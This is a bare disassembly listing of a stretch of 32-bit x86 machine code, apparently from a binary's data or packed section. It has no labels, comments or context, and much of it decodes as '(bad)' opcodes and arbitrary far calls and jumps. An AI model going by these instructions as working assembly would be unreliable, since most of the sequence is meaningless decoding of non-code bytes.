  42fc0a:	xor    bl,bl
  42fc0c:	dec    edx
  42fc0d:	das    
  42fc0e:	popf   
  42fc0f:	jo     0x42fc11
	...
  42fc71:	add    BYTE PTR [eax],al
  42fc73:	add    BYTE PTR [ebx],cl
  42fc75:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  42fc7b:	call   0x45f9:0x2036325e
  42fc82:	mul    DWORD PTR [esi-0x80]
  42fc85:	inc    DWORD PTR [ecx]
  42fc87:	add    BYTE PTR [ecx+eax*1],al
  42fc8a:	add    BYTE PTR [eax],al
  42fc8c:	das    
  42fc8d:	dec    edi
  42fc8e:	popa   
  42fc8f:	test   al,0xff
  42fc91:	push   ss
  42fc92:	xchg   ebp,eax
  42fc93:	lock adc al,0xb0
  42fc96:	sbb    eax,0xeb574d1e
  42fc9b:	pushw  ds
  42fc9d:	push   esp
  42fc9e:	(bad)  
  42fc9f:	pop    eax
  42fca0:	cmp    BYTE PTR [ecx+ebp*4+0x5c7518fa],cl
  42fca7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fca8:	popa   
  42fca9:	add    ah,BYTE PTR [ecx+ecx*4+0x24d8fe9b]
  42fcb0:	std    
  42fcb1:	pop    esp
  42fcb2:	jne    0x42fc59
  42fcb4:	mov    edx,0xeeb83d38
  42fcb9:	or     al,dh
  42fcbb:	xchg   esi,eax
  42fcbc:	fistp  DWORD PTR [edx]
  42fcbe:	leave  
  42fcbf:	sti    
  42fcc0:	ret    
  42fcc1:	xchg   edx,eax
  42fcc2:	mov    ebp,0x768c2b1b
  42fcc7:	inc    esi
  42fcc8:	add    eax,0xf238e783
  42fccd:	test   ah,cl
  42fccf:	adc    BYTE PTR [ecx+0x16],bh
  42fcd2:	mov    esi,0x36918510
  42fcd7:	out    dx,al
  42fcd8:	and    esi,DWORD PTR [edi+0x35]
  42fcdb:	rcr    DWORD PTR [eax+0x38],1
  42fcde:	and    BYTE PTR [edi-0x49],ch
  42fce1:	(bad)  
  42fce2:	cmp    al,BYTE PTR [edi+0x43c688e]
  42fce8:	mov    ah,0xb9
  42fcea:	cmp    edx,ebx
  42fcec:	ins    BYTE PTR es:[edi],dx
  42fced:	repz loopne 0x42fd6d
  42fcf0:	xor    edx,DWORD PTR [esi-0x50643f62]
  42fcf6:	mov    BYTE PTR [eax-0x55],ch
  42fcf9:	(bad)  
  42fcfb:	int3   
  42fcfc:	push   cs
  42fcfd:	push   ecx
  42fcfe:	and    al,0xe4
  42fd00:	shr    DWORD PTR [ebx-0x1c65974a],1
  42fd06:	lds    edx,FWORD PTR [ebx+0x596e05d4]
  42fd0c:	push   ecx
  42fd0d:	dec    ecx
  42fd0e:	test   BYTE PTR [ecx-0x6ac815bc],0x3c
  42fd15:	pop    ecx
  42fd16:	nop
  42fd17:	popf   
  42fd18:	stc    
  42fd19:	lock cmp DWORD PTR [esi+ebp*1],esi
  42fd1d:	or     ch,BYTE PTR ds:0xe391cd15
  42fd23:	jne    0x42fd3c
  42fd25:	or     ah,bl
  42fd27:	pop    esp
  42fd28:	ds push ds
  42fd2a:	mov    esi,0xe4e36cf8
  42fd2f:	mov    ecx,0x935cdb1d
  42fd34:	ss (bad) 
  42fd36:	fiadd  DWORD PTR [eax+eax*4-0x25]
  42fd3a:	iret   
  42fd3b:	or     al,0xca
  42fd3d:	push   eax
  42fd3e:	and    DWORD PTR [esi+0x7d],ebx
  42fd41:	cmc    
  42fd42:	sbb    dh,BYTE PTR [esp+ebp*8]
  42fd45:	inc    esp
  42fd46:	mov    ah,0x5b
  42fd48:	mov    ch,0xeb
  42fd4a:	je     0x42fdb3
  42fd4c:	pop    ebx
  42fd4d:	hlt    
  42fd4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fd4f:	ins    BYTE PTR es:[edi],dx
  42fd50:	adc    cl,BYTE PTR [ebx]
  42fd52:	pop    ss
  42fd53:	mov    eax,ds:0xc1fb5869
  42fd58:	in     al,dx
  42fd59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fd5a:	sar    esi,1
  42fd5c:	call   0xd28c:0xe3214df4
  42fd63:	outs   dx,BYTE PTR ds:[esi]
  42fd64:	dec    esi
  42fd65:	dec    eax
  42fd66:	pop    es
  42fd67:	mov    DWORD PTR [ecx-0x615f1389],edi
  42fd6d:	bound  ebx,QWORD PTR [ecx-0x1f]
  42fd70:	(bad)  
  42fd71:	scas   al,BYTE PTR es:[edi]
  42fd72:	arpl   WORD PTR [edi-0x1ff84f8c],di
  42fd78:	aaa    
  42fd79:	and    eax,0xa9a2128f
  42fd7e:	add    eax,0xaa1d88d6
  42fd83:	mov    ah,0x3e
  42fd85:	dec    ecx
  42fd86:	ror    ebx,0xe3
  42fd89:	(bad)  
  42fd8a:	fisttp WORD PTR [ebx+0x50]
  42fd8d:	idiv   BYTE PTR [ecx]
  42fd8f:	add    eax,0x0
	...
  42fdf4:	dec    eax
  42fdf5:	rol    dl,0xf0
  42fdf8:	retf   0x7af2
  42fdfb:	clc    
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	rep lods eax,DWORD PTR ds:[esi]
  42fe01:	rol    DWORD PTR [edi+0x1],1
  42fe04:	test   BYTE PTR [eax],al
  42fe06:	add    al,BYTE PTR [eax]
  42fe08:	add    al,0x1
  42fe0a:	add    BYTE PTR [eax],al
  42fe0c:	jae    0x42fde5
  42fe0e:	fisubr DWORD PTR [esi-0x5b5a5905]
  42fe14:	cld    
  42fe15:	xchg   edx,eax
  42fe16:	fcmovnu st,st(7)
  42fe18:	nop
  42fe19:	iret   
  42fe1a:	and    eax,0x3a6b487
  42fe1f:	jmp    0x42fdeb
  42fe21:	repnz mov esi,0xe04a60d3
  42fe27:	xor    esi,DWORD PTR [edi-0x58]
  42fe2a:	jge    0x42fe5b
  42fe2c:	lods   eax,DWORD PTR ds:[esi]
  42fe2d:	and    DWORD PTR es:[ebx+0x52],esi
  42fe31:	sbb    DWORD PTR [edx+0x48],ebx
  42fe34:	imul   esi,esp,0x768a1fc4
  42fe3a:	dec    BYTE PTR [ebp-0x6bb7383c]
  42fe40:	push   edx
  42fe41:	imul   ebx,DWORD PTR [edi+ebx*4-0x1a],0x3f
  42fe46:	rcl    edx,0x46
  42fe49:	adc    ecx,ebp
  42fe4b:	sbb    edx,DWORD PTR [edi]
  42fe4d:	mov    esi,0x75d242a9
  42fe52:	xchg   edi,eax
  42fe53:	jmp    0xa1cd6a0f
  42fe58:	test   BYTE PTR [edx],dl
  42fe5a:	hlt    
  42fe5b:	push   0xbabd883d
  42fe60:	add    DWORD PTR [ecx],ebx
  42fe62:	mov    ecx,0x83e78fc4
  42fe67:	cs popa 
  42fe69:	mov    cs:0x710c97c8,al
  42fe6f:	das    
  42fe70:	(bad)  [ecx+0x2ae726e6]
  42fe76:	jbe    0x42feaf
  42fe78:	int    0x33
  42fe7a:	or     al,0x1e
  42fe7c:	lods   eax,DWORD PTR ds:[esi]
  42fe7d:	test   eax,0x60cb4c38
  42fe82:	dec    esi
  42fe83:	dec    ecx
  42fe84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fe85:	arpl   WORD PTR [eax+esi*1+0x27],ax
  42fe89:	cmc    
  42fe8a:	adc    BYTE PTR [esi+0x3],cl
  42fe8d:	adc    ch,BYTE PTR [esi-0x74]
  42fe90:	mov    dh,0xd6
  42fe92:	outs   dx,DWORD PTR ds:[esi]
  42fe93:	popa   
  42fe94:	push   eax
  42fe95:	mov    ds:0xf5c63588,al
  42fe9a:	pop    ebx
  42fe9b:	adc    DWORD PTR [esi+0x4016ffb],esi
  42fea1:	mov    dl,0x72
  42fea3:	inc    ebx
  42fea4:	cmp    eax,0xf24f643
  42fea9:	bound  ecx,QWORD PTR [edi]
  42feab:	out    0xda,al
  42fead:	add    bl,dl
  42feaf:	dec    edx
  42feb0:	loope  0x42fe89
  42feb2:	or     DWORD PTR ds:0xa24316d5,ebp
  42feb8:	hlt    
  42feb9:	fwait
  42feba:	jo     0x42fea4
  42febc:	test   al,0x3c
  42febe:	sbb    eax,ebx
  42fec0:	xchg   ecx,eax
  42fec1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fec2:	xchg   ebp,eax
  42fec3:	in     al,0xda
  42fec5:	and    al,0xc
  42fec7:	fwait
  42fec8:	push   ebp
  42fec9:	std    
  42feca:	ja     0x42fe67
  42fecc:	(bad)  
  42fecd:	fucomi st,st(0)
  42fecf:	ret    
  42fed0:	xchg   edi,eax
  42fed1:	(bad)  
  42fed2:	mov    al,ds:0x42df17fe
  42fed7:	int3   
  42fed8:	mov    cl,0xd8
  42feda:	in     eax,dx
  42fedb:	adc    ebp,ebx
  42fedd:	dec    edx
  42fede:	adc    ebp,DWORD PTR cs:[edi]
  42fee1:	fstp   DWORD PTR [ebp-0x40]
  42fee4:	outs   dx,DWORD PTR ds:[esi]
  42fee5:	push   0x77
  42fee7:	and    al,0xa8
  42fee9:	aas    
  42feea:	enter  0xce8a,0x21
  42feee:	out    dx,al
  42feef:	dec    ebp
  42fef0:	pushf  
  42fef1:	fisttp QWORD PTR [esi+ebx*8+0x5bcfbfd0]
  42fef8:	dec    esp
  42fef9:	pop    ds
  42fefa:	jae    0x42fe7f
  42fefc:	call   0x702c:0xf49ba241
  42ff03:	aam    0xef
  42ff05:	mov    ch,0xce
  42ff07:	dec    edx
  42ff08:	and    al,0xdf
  42ff0a:	imul   eax,DWORD PTR [ecx-0x42],0xffffff80
  42ff0e:	inc    esp
  42ff0f:	aaa    
	...
  42ff74:	add    al,0x67
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [eax+eiz*4+0x73],0xaf
  42ff83:	js     0x443018a
  42ff89:	add    DWORD PTR [eax],eax
  42ff8b:	add    BYTE PTR [esi-0x59c7216f],cl
  42ff91:	cmp    DWORD PTR [ebx],ebx
  42ff93:	xor    cl,BYTE PTR [edi-0x4b]
  42ff96:	jno    0x42ffb8
  42ff98:	das    
  42ff99:	sbb    dh,dl
  42ff9b:	adc    ebx,eax
  42ff9d:	scas   al,BYTE PTR es:[edi]
  42ff9e:	rol    DWORD PTR [ecx],1
  42ffa0:	mov    dl,0xd7
  42ffa2:	mov    ds:0x76fc62c1,eax
  42ffa7:	out    0xd1,al
  42ffa9:	xchg   esp,eax
  42ffaa:	dec    esp
  42ffab:	add    esp,DWORD PTR [edx+esi*1-0x18e0edc6]
  42ffb2:	mov    eax,0x126c7f60
  42ffb7:	sub    dl,BYTE PTR [edi+esi*4+0xf]
  42ffbb:	jmp    0x243a0f3a
  42ffc0:	(bad)  [edx-0x66]
  42ffc3:	aaa    
  42ffc4:	int    0xce
  42ffc6:	repz xor DWORD PTR [edx],eax
  42ffc9:	repz or al,0x63
  42ffcc:	ds or  al,ch
  42ffcf:	push   0xcecaab5a
  42ffd4:	and    eax,0x13bc4e8d
  42ffd9:	inc    esp
  42ffda:	push   0x21
  42ffdc:	sbb    ch,BYTE PTR [eax-0x7f]
  42ffdf:	imul   ecx,edi,0x228515e
  42ffe5:	xor    DWORD PTR [ebx+eiz*1+0x6fa3f2f8],esp
  42ffec:	add    BYTE PTR [esi],ah
  42ffee:	outs   dx,DWORD PTR ds:[esi]
  42ffef:	in     al,0x90
  42fff1:	pop    edx
  42fff2:	inc    ebp
  42fff3:	inc    esp
  42fff4:	jmp    0x42ffc2
  42fff6:	js     0x42ffd6
  42fff8:	sub    ebp,DWORD PTR [esi]
  42fffa:	stos   BYTE PTR es:[edi],al
  42fffb:	xchg   edx,eax
  42fffc:	push   ecx
  42fffd:	inc    ecx
  42fffe:	(bad)  
  42ffff:	sub    eax,0x745e40fd
  430004:	icebp  
  430005:	jno    0x42ff99
  430007:	int    0x1f
  430009:	push   esi
  43000a:	mov    eax,0xb8a52d9
  43000f:	sbb    eax,0xbddd8c10
  430014:	or     al,0x41
  430016:	callw  0x2e66
  43001a:	lods   al,BYTE PTR ds:[esi]
  43001b:	iret   
  43001c:	in     al,dx
  43001d:	cmp    al,0xa5
  43001f:	dec    esp
  430020:	sar    DWORD PTR [edi-0x7],cl
  430023:	in     eax,dx
  430024:	cmp    BYTE PTR [eax-0x26],ch
  430027:	sbb    eax,0xe578078a
  43002c:	inc    ebx
  43002d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43002e:	jnp    0x42ffe7
  430030:	mov    dl,0x7e
  430032:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430034:	and    al,0xf5
  430036:	push   esi
  430037:	iret   
  430038:	imul   ebx,esi,0xffffff83
  43003b:	xchg   ecx,eax
  43003c:	push   esi
  43003d:	mov    edi,0x50a5adc4
  430042:	push   ss
  430043:	jo     0x42ffff
  430045:	in     al,dx
  430046:	push   es
  430047:	push   ss
  430048:	cmp    DWORD PTR [edi-0x53],ecx
  43004b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43004c:	test   eax,0xae9718c4
  430051:	pushf  
  430052:	jbe    0x4300a3
  430054:	gs enter 0x386,0x9b
  430059:	dec    edi
  43005a:	out    dx,al
  43005b:	or     edx,DWORD PTR [edi-0x48]
  43005e:	cmp    eax,0x30bb9cb2
  430063:	jge    0x43007a
  430065:	aad    0x15
  430067:	sub    al,0xa1
  430069:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43006a:	(bad)  
  43006b:	lds    eax,FWORD PTR [ebp-0x49]
  43006e:	popa   
  43006f:	loope  0x4300ce
  430071:	icebp  
  430072:	(bad)  
  430073:	and    ah,BYTE PTR [edi+eiz*2+0x7bf692da]
  43007a:	dec    ecx
  43007b:	pop    ss
  43007c:	aas    
  43007d:	adc    al,0x41
  43007f:	lods   eax,DWORD PTR ds:[esi]
  430080:	cmp    eax,0x9da81660
  430085:	jns    0x4300f3
  430087:	push   esi
  430088:	inc    edi
  430089:	repz pushf 
  43008b:	icebp  
  43008c:	dec    esp
  43008d:	jno    0x430072
  43008f:	and    al,BYTE PTR [eax]
	...
  4300f1:	add    BYTE PTR [eax],al
  4300f3:	add    bh,al
  4300f5:	ins    DWORD PTR es:[edi],dx
  4300f6:	aam    0xb5
  4300f8:	(bad)  
  4300f9:	mov    ebp,0x9547fe7
  4300fe:	scas   eax,DWORD PTR es:[edi]
  4300ff:	add    al,0x28
  430101:	daa    
  430102:	sbb    BYTE PTR [ecx-0x74],cl
  430105:	add    al,BYTE PTR [edx]
  430107:	add    BYTE PTR [ebx+0x0],bh
  43010a:	add    BYTE PTR [eax],al
  43010c:	repnz aaa 
  43010e:	test   BYTE PTR [edx-0x3d],0x93
  430112:	inc    edi
  430113:	outs   dx,DWORD PTR ds:[esi]
  430114:	jp     0x4300c2
  430116:	data16 js 0x4300bb
  430119:	xchg   edi,eax
  43011a:	clc    
  43011b:	inc    ebp
  43011c:	xchg   esi,eax
  43011d:	push   ebx
  43011e:	pop    ebp
  43011f:	nop
  430120:	stc    
  430121:	cmp    BYTE PTR [ecx-0x41],ah
  430124:	retf   0xc61a
  430127:	out    0xbe,al
  430129:	(bad)  
  43012a:	std    
  43012b:	or     DWORD PTR [edi+0x23f46ac2],ebx
  430131:	pop    ebx
  430132:	out    dx,eax
  430133:	ror    DWORD PTR [ebp+0x47ce6b86],0xeb
  43013a:	xor    DWORD PTR [edx+0x647f691a],esp
  430140:	cdq    
  430141:	sub    eax,0x82ec70f7
  430146:	add    al,0x8e
  430148:	mov    edx,0x845c413a
  43014d:	dec    ecx
  43014e:	jmp    0x51a3ab9e
  430153:	mov    ah,0xa2
  430155:	call   0x6415:0xc7a55727
  43015c:	adc    DWORD PTR [edx-0x2f],ebp
  43015f:	cmp    eax,0xd18969c7
  430164:	sub    eax,DWORD PTR [edi]
  430166:	lods   al,BYTE PTR ds:[esi]
  430167:	idiv   BYTE PTR [ecx-0x30]
  43016a:	push   ss
  43016b:	mov    dh,0xb5
  43016d:	rcr    DWORD PTR [ebp+0x78a6dba5],1
  430173:	ja     0x430177
  430175:	add    BYTE PTR [ebx],cl
  430177:	adc    DWORD PTR [ebx+0x4d],ebp
  43017a:	shl    DWORD PTR [ebp+0x8],cl
  43017d:	fsubp  st(1),st
  43017f:	add    DWORD PTR [edi+0x1e],ebx
  430182:	pop    ss
  430183:	test   eax,0xc22b89
	...
  4301f4:	dec    ebp
  4301f5:	push   ebp
  4301f6:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  4301fc:	mov    esp,ebp
  4301fe:	or     ah,dh
  430200:	dec    ebp
  430201:	add    bh,al
  430203:	add    BYTE PTR [eax],cl
  430205:	add    BYTE PTR [eax],al
  430207:	mov    DWORD PTR [eax],0x40f44545
  43020d:	xor    DWORD PTR [eax],eax
  43020f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430215:	(bad)  
  430216:	enter  0x4d45,0xbc
  43021a:	mov    esi,DWORD PTR [edx]
  43021c:	hlt    
  43021d:	test   ebx,ecx
  43021f:	pushf  
  430220:	enter  0x4df8,0x8b
  430224:	mov    DWORD PTR [ebp+0x8],0x894708
  43022b:	inc    ebp
  43022c:	mov    ebp,0xff8bfffc
  430231:	dec    ebp
  430232:	mov    ch,0xf4
  430234:	call   DWORD PTR [ebx-0x1]
  430237:	mov    ebx,0x8005474
  43023c:	call   DWORD PTR [ecx+0x8]
  43023f:	pop    es
  430240:	jmp    0xb8:0xacb4533
  430247:	fwait
  430248:	mov    esi,DWORD PTR [edx-0xc]
  43024b:	xor    cl,bl
  43024d:	add    BYTE PTR [ebx+0x3c83203],bl
  430253:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  430259:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  43025f:	xor    eax,DWORD PTR [eax]
  430261:	retf   
  430262:	retf   
  430263:	add    ecx,eax
  430265:	enter  0x894d,0x64
  430269:	dec    ebp
  43026a:	sbb    ah,cl
  43026c:	add    BYTE PTR [ebx-0xb9bb277],cl
  430272:	dec    DWORD PTR [ebx-0xbcfb275]
  430278:	test   DWORD PTR [ebx],esi
  43027a:	dec    ebx
  43027c:	inc    DWORD PTR [ebx]
  43027e:	inc    eax
  43027f:	enter  0x8989,0x50
  430283:	(bad)  
  430284:	call   DWORD PTR [ebx+ecx*4-0x1]
  430288:	cld    
  430289:	dec    DWORD PTR [ebp-0xa90001]
  43028f:	push   edi
  430290:	mov    BYTE PTR [edx+0x1],ch
  430293:	and    al,BYTE PTR [eax]
  430295:	pop    ecx
  430296:	inc    ebp
  430297:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43029d:	push   0xffffff89
  43029f:	pop    ecx
  4302a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4302a1:	dec    ebp
  4302a2:	add    BYTE PTR [ecx+0x45fc088b],cl
  4302a8:	jne    0x4302f4
  4302aa:	lea    eax,[eax]
  4302ac:	push   eax
  4302ad:	(bad)  
  4302ae:	dec    DWORD PTR [eax]
  4302b0:	mov    DWORD PTR [eax],eax
  4302b2:	test   al,0x0
  4302b4:	add    BYTE PTR [ebp-0x18],cl
  4302b7:	xor    ebp,DWORD PTR [ebx]
  4302b9:	add    eax,DWORD PTR [eax]
  4302bb:	mov    eax,eax
  4302bd:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4302c4:	inc    ebp
  4302c5:	mov    DWORD PTR [ebx+0x459408],ecx
  4302cb:	arpl   WORD PTR [ebx-0x372749b],cx
  4302d1:	sub    al,0x80
  4302d3:	inc    DWORD PTR [ecx]
  4302d5:	lea    eax,[eax]
  4302d7:	or     al,0x0
  4302d9:	inc    DWORD PTR [ecx-0x18]
  4302dc:	mov    ecx,DWORD PTR [ebx]
  4302de:	cld    
  4302df:	add    BYTE PTR [ecx+0x75014d],cl
  4302e5:	(bad)  
  4302e6:	xchg   ebp,eax
  4302e7:	fdivr  st,st(7)
  4302e9:	inc    eax
  4302ea:	inc    DWORD PTR [eax]
  4302ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4302ef:	xor    edx,DWORD PTR [edx+0x7201b8]
  4302f5:	add    BYTE PTR [edx],dl
  4302f7:	enter  0x4d90,0x0
  4302fb:	mov    eax,DWORD PTR [eax]
  4302fd:	hlt    
  4302fe:	add    al,0xa5
  430300:	mov    al,0xff
  430302:	add    bh,bh
  430304:	add    BYTE PTR [ebx],dh
  430306:	inc    DWORD PTR [ebx]
  430308:	sbb    al,0x89
  43030a:	jne    0x4302e8
  43030c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430312:	mov    eax,DWORD PTR [ebp-0xff0048]
  430318:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43031f:	inc    DWORD PTR [ebp-0x75]
  430322:	fisttp QWORD PTR [esi+ebp*8]
  430325:	test   DWORD PTR [esi-0x1],esp
  430328:	inc    ebp
  430329:	(bad)  
  43032a:	aas    
  43032b:	inc    ebp
  43032c:	(bad)  
  43032d:	lea    edi,[esp+eiz*2-0x1]
  430331:	inc    edi
  430333:	mov    DWORD PTR ds:0x8000c7a0,edi
  430339:	mov    ebp,esp
  43033b:	cld    
  43033c:	loop   0x4302cb
  43033e:	inc    ebp
  43033f:	(bad)  
  430340:	out    dx,al
  430341:	(bad)  
  430342:	fisttp WORD PTR [eax+0x8801c7]
  430348:	jecxz  0x43038f
  43034a:	in     al,dx
  43034b:	inc    DWORD PTR [ebp-0x4]
  43034e:	out    0x8d,eax
  430350:	aas    
  430351:	inc    edi
  430353:	jmp    FWORD PTR [eax-0x78]
  430356:	inc    DWORD PTR [ecx]
  430358:	mov    DWORD PTR [eax],0xc7043d
  43035e:	ins    BYTE PTR es:[edi],dx
  43035f:	test   edi,edi
  430361:	pandn  mm0,mm5
  430364:	aas    
  430365:	add    bh,al
  430367:	mov    esi,DWORD PTR [eax-0x4]
  43036a:	inc    DWORD PTR [eax+0xdf01ee]
  430370:	(bad)  
  430371:	or     BYTE PTR [ebp+eax*2-0x1],dh
  430375:	mov    ebp,ebx
  430377:	xchg   esp,eax
  430378:	fild   DWORD PTR [eax]
  43037a:	(bad)  
  43037b:	mov    edi,DWORD PTR [eax+0x3]
  43037e:	(bad)  
  43037f:	cmp    al,0xe7
  430381:	dec    ebp
  430382:	leave  
  430383:	mov    ebp,eax
  430385:	fsubr  DWORD PTR [edx]
  430387:	add    BYTE PTR [eax],al
  430389:	lea    ecx,[ebx-0x7f0003b4]
  43038f:	push   edx
  430390:	add    DWORD PTR [ebp+0x0],edx
  430393:	mov    esi,DWORD PTR [eax]
  430395:	mov    WORD PTR [edi],ss
  430397:	add    BYTE PTR [eax],al
  430399:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43039f:	add    ah,bh
  4303a1:	push   0x7d
  4303a3:	dec    DWORD PTR [ebx+0xd88c]
  4303a9:	push   edx
  4303aa:	mov    edx,DWORD PTR [ecx-0x4]
  4303ad:	call   DWORD PTR [eax+0x7d01fc]
  4303b3:	mov    esi,DWORD PTR [esi]
  4303b5:	cld    
  4303b6:	add    BYTE PTR [eax+0x560150],dl
  4303bc:	test   DWORD PTR [ebp+0x75],eax
  4303bf:	loop   0x43034c
  4303c1:	jmp    0xe38b:0x947dc7fc
  4303c8:	fsub   st,st(7)
  4303ca:	add    bh,al
  4303cc:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  4303d2:	add    edi,edi
  4303d4:	add    bh,bh
  4303d6:	adc    al,0xed
  4303d8:	add    dh,ah
  4303da:	push   eax
  4303db:	inc    ebp
  4303dc:	push   esi
  4303dd:	fisttp WORD PTR [ebx+0x4dc7f43f]
  4303e3:	test   BYTE PTR [ebx],dh
  4303e5:	out    0x5,al
  4303e7:	shl    BYTE PTR [edx+0x45],0x0
  4303eb:	jmp    0x4303ae
  4303ed:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  4303f4:	inc    esi
  4303f5:	jle    0x4303f7
  4303f7:	test   edi,eax
  4303f9:	(bad)  
  4303fa:	call   0x13004fe
  4303ff:	out    0x75,al
  430401:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430407:	in     al,dx
  430408:	mov    esp,edx
  43040a:	mov    ah,0x85
  43040c:	add    bh,bh
  43040e:	call   0x1292e12
  430413:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43041a:	add    ebx,esp
  43041c:	add    ah,ch
  43041e:	xor    BYTE PTR [ebp-0xff0073],al
  430424:	mov    ebx,ebp
  430426:	cld    
  430427:	jle    0x4303b2
  430429:	add    DWORD PTR gs:[eax],eax
  43042c:	add    BYTE PTR [eax+0x1],dl
  43042f:	inc    ebp
  430430:	inc    ebp
  430431:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  430437:	dec    DWORD PTR [ebx-0x3fd80318]
  43043d:	add    BYTE PTR [ebp-0xbf0040],dl
  430443:	inc    ebp
  430444:	fmul   QWORD PTR [ebx-0x4faf0400]
  43044a:	inc    ebp
  43044b:	add    DWORD PTR [ebx+0x459c00],ecx
  430451:	mov    edi,edi
  430453:	mov    eax,0xe80800ff
  430458:	inc    ebp
  430459:	sub    cl,BYTE PTR [ebx-0x47000400]
  43045f:	add    al,0x1
  430461:	rol    BYTE PTR [eax],0x1e
  430464:	jne    0x4304ab
  430466:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  43046c:	inc    DWORD PTR [ecx]
  43046e:	call   0x882d73
  430473:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  430479:	call   0x432e7f
  43047e:	xor    bh,bh
  430480:	push   edi
  430481:	adc    BYTE PTR [ebx-0x74741bbb],al
  430487:	fsub   st,st(4)
  430489:	ret    
  43048a:	loopne 0x430427
  43048c:	xor    DWORD PTR [edx],0x31
  43048f:	cmp    edi,edi
  430491:	bswap  eax
  430493:	rol    BYTE PTR gs:[eax],0x5
  430497:	jmp    0x12e05e1
  43049c:	mov    eax,DWORD PTR [ebp-0x4]
  43049f:	add    BYTE PTR [eax+0xff0100],bh
  4304a5:	cld    
  4304a6:	jne    0x430525
  4304a8:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4304ae:	jb     0x4304b1
  4304b0:	add    BYTE PTR [eax],al
  4304b2:	push   eax
  4304b3:	fild   DWORD PTR [ebp+0x0]
  4304b6:	mov    edx,DWORD PTR [eax-0x68]
  4304b9:	inc    ebp
  4304ba:	add    BYTE PTR [ebx+0xffa8ff],cl
  4304c0:	or     bh,bh
  4304c2:	inc    ebp
  4304c3:	call   0x1272bc7
  4304c8:	jge    0x430517
  4304ca:	adc    BYTE PTR [ebx+0x459cb9],cl
  4304d0:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  4304d6:	fwait
  4304d7:	mov    eax,0x30132
  4304dc:	lea    esi,[ebp+0x2c]
  4304df:	xor    edi,edi
  4304e1:	(bad)  
  4304e2:	call   0x1422e4f
  4304e7:	call   0x1372e77
  4304ec:	jne    0x430479
  4304ee:	xor    edi,esp
  4304f0:	add    eax,DWORD PTR [eax+0xc018d]
  4304f6:	push   DWORD PTR [eax]
  4304f8:	call   0xcc2e54
  4304fd:	enter  0x45ff,0xe0
  430501:	mov    ecx,DWORD PTR [ebp-0x28]
  430504:	xor    eax,DWORD PTR [eax]
  430506:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43050c:	(bad)  
  43050d:	xchg   ebp,eax
  43050e:	call   0x1420612
  430513:	mov    cl,0x45
  430515:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43051b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  430522:	mov    edi,edi
  430524:	or     BYTE PTR [eax],cl
  430526:	inc    ebp
  430527:	test   DWORD PTR gs:[eax],eax
  43052a:	je     0x430571
  43052c:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  430532:	xor    edx,DWORD PTR [eax-0x73]
  430535:	push   ebp
  430536:	or     BYTE PTR [ebp+0x21007572],al
  43053c:	inc    ebp
  43053d:	loopne 0x4304ca
  43053f:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  430546:	int    0x0
  430548:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  43054e:	inc    ebp
  43054f:	push   ebp
  430550:	cmp    ebp,eax
  430552:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  430559:	cld    
  43055a:	fadd   QWORD PTR [eax+0x3b014d]
  430560:	jne    0x430592
  430562:	push   0xf8898557
  430567:	loopne 0x4305de
  430569:	inc    ebp
  43056a:	lea    eax,[ebx+0x72e8e4cc]
  430570:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  430576:	jmp    0x4305ab
  430578:	mov    edi,DWORD PTR [edi+0x4572bc]
  43057e:	xor    eax,edi
  430580:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43058a:	rcl    BYTE PTR [eax-0x40],1
  43058d:	inc    ebp
  43058e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430596:	inc    ebp
  430597:	xchg   ebp,eax
  430598:	ud0    ebp,DWORD PTR [ebx]
  43059b:	inc    DWORD PTR [eax]
  43059d:	daa    
  43059e:	jbe    0x4305a0
  4305a0:	mov    dl,BYTE PTR [eax-0x80]
  4305a3:	push   ebp
  4305a4:	pop    ds
  4305a5:	mov    ecx,DWORD PTR [esp+esi*8]
  4305a8:	inc    eax
  4305a9:	retf   
  4305aa:	inc    ebp
  4305ab:	iret   
  4305ac:	jb     0x430576
  4305ae:	mov    eax,DWORD PTR [edi]
  4305b0:	int3   
  4305b1:	inc    ebp
  4305b2:	inc    ebp
  4305b3:	add    DWORD PTR [ecx],esi
  4305b5:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  4305bc:	xor    dh,BYTE PTR [ebx]
